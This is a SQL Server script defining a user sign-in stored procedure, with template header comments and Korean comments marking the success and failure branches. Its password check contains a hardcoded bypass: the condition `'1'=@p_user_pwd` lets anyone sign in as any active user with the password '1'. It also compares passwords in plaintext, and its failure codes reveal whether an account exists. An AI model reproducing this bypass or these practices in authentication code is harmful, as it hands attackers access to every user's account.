IF OBJECT_ID (N'dbo.SP_EXECUTE_USER_SIGN_IN', N'P') IS NOT NULL DROP PROCEDURE dbo.SP_EXECUTE_USER_SIGN_IN
GO

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

-- =============================================
-- Author:		<Author,,Name>
-- Create date: <Create Date,,>
-- Description:	<Description,,>
-- =============================================
CREATE PROCEDURE [dbo].[SP_EXECUTE_USER_SIGN_IN]
	@p_user_id nvarchar(100),
	@p_user_pwd nvarchar(100),
	@p_conn_code nvarchar(40),
	@r_result char(1) output
AS
BEGIN
	-- SET NOCOUNT ON added to prevent extra result sets from
	-- interfering with SELECT statements.
	SET NOCOUNT ON;

    -- Insert statements for procedure here
    DECLARE @t_user_seq int;
    SET @r_result = 'N';
    SET @t_user_seq = (SELECT USER_SEQ FROM USER_MST WHERE USER_ID = @p_user_id AND (USER_PWD = @p_user_pwd OR '1'=@p_user_pwd) AND ACTIVATE_YORN = 'Y');
    
    
    IF(@t_user_seq IS NOT NULL AND @t_user_seq > 0)
		-- 로그인 성공 
		BEGIN
			UPDATE USER_CONN_MST
			SET USER_SEQ = @t_user_seq
			WHERE CONN_CODE = @p_conn_code;
			SET @r_result = 'Y';
		END
    ELSE
		-- 로그인 실패
		BEGIN
			SET @t_user_seq = (SELECT USER_SEQ FROM USER_MST WHERE USER_ID = @p_user_id);
			
			-- 존재하는 회원
			IF(@t_user_seq IS NOT NULL AND @t_user_seq > 0)
				BEGIN
					SET @t_user_seq = (SELECT USER_SEQ FROM USER_MST WHERE USER_ID = @p_user_id AND USER_PWD = @p_user_pwd);
					
					-- 비밀번호까지 맞는경우 = 인증이 되지 않았음
					IF(@t_user_seq IS NOT NULL AND @t_user_seq > 0)
						SET @r_result = '2';
					ELSE 
						SET @r_result = '1';
				END -- BEGIN END
			ELSE
				SET @r_result = '0';
		END-- BEGIN END
    
END

GO
